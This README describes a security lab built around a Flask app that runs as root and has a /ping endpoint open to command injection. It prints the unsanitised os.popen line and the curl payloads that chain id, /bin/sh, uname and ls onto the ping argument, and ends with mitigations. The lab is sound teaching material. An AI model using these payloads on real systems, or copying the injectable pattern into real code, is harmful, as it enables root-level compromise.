# Root Privileged Remote Command Execution (RCE) Lab

## Project Overview

This project demonstrates how a web application running with **root privileges**
can be fully compromised through **command injection**, resulting in
**Remote Command Execution (RCE)**.

The application is intentionally vulnerable and deployed in a **controlled local
environment** to study exploitation impact and defensive mitigations.

> ⚠️ Educational and defensive security research only.

---

## Architecture

Attacker (curl)
→ Vulnerable Flask Web Application (runs as root)
→ OS Command Execution
→ /bin/sh executed with root privileges

---

## Vulnerability Description

The `/ping` endpoint directly concatenates user input into an OS command:
```python
    os.popen(f"ping -c 1 {ip}")
```
### Root Cause

- No input sanitization
- Use of os.popen() invokes a shell
- Shell metacharacters (`;`) allow command chaining
- Application runs as root

This results in **arbitrary command execution with root privileges**.

---

## Exploitation

### 1. Service Verification
```bash
    curl http://127.0.0.1:5000
```
Output:
```bash
    Root RCE Lab Running
```
---

### 2. Command Injection Proof
```bash
    curl "http://127.0.0.1:5000/ping?ip=127.0.0.1;id"
```
Output:
```bash
    uid=0(root) gid=0(root) groups=0(root)
```
✔ Confirms RCE as root.

---

### 3. Executing /bin/sh (Root Context)

Because URLs cannot contain raw spaces or quotes, payloads must be encoded.
```bash
    curl "http://127.0.0.1:5000/ping?ip=127.0.0.1;/bin/sh%20-c%20whoami"
```
Output:
```bash
    root
```
✔ Confirms `/bin/sh` execution with inherited root privileges.

---

### 4. Clean Exploitation Using curl Encoding
```bash
    curl --get \
      --data-urlencode "ip=127.0.0.1;/bin/sh -c whoami" \
      http://127.0.0.1:5000/ping
```
---

### 5. Additional Proof of Compromise
```bash
    curl "http://127.0.0.1:5000/ping?ip=127.0.0.1;uname%20-a"

    curl "http://127.0.0.1:5000/ping?ip=127.0.0.1;ls%20/"
```
---

## Impact

Because the application runs as **root**, successful RCE allows:

- Arbitrary command execution
- Full filesystem access
- Persistence mechanisms
- Complete system compromise

> RCE severity depends entirely on the privilege level of the vulnerable process.

---

## Mitigation

### 1. Drop Root Privileges
- Run services as non-root users
- Apply least privilege principle

### 2. Avoid Shell Execution
Replace:
```python
    os.popen()
```
With:
```python
    subprocess.run([...], shell=False)
```
### 3. Input Validation
- Strict allowlists
- Reject shell metacharacters

### 4. Defense-in-Depth
- seccomp
- AppArmor / SELinux
- Container isolation

---

## Key Takeaways

- RCE is dangerous
- Root-privileged RCE is catastrophic
- `/bin/sh` inherits the privilege context of the process
- Secure design prevents full system compromise

---

## Skills Demonstrated

- Remote Command Execution (RCE)
- Command Injection
- Linux privilege context
- Secure coding practices
- HTTP payload encoding
- Red Team exploitation methodology

---

## Disclaimer

This project is intentionally vulnerable and must **never be deployed in production**.
All testing was performed in a controlled local environment.

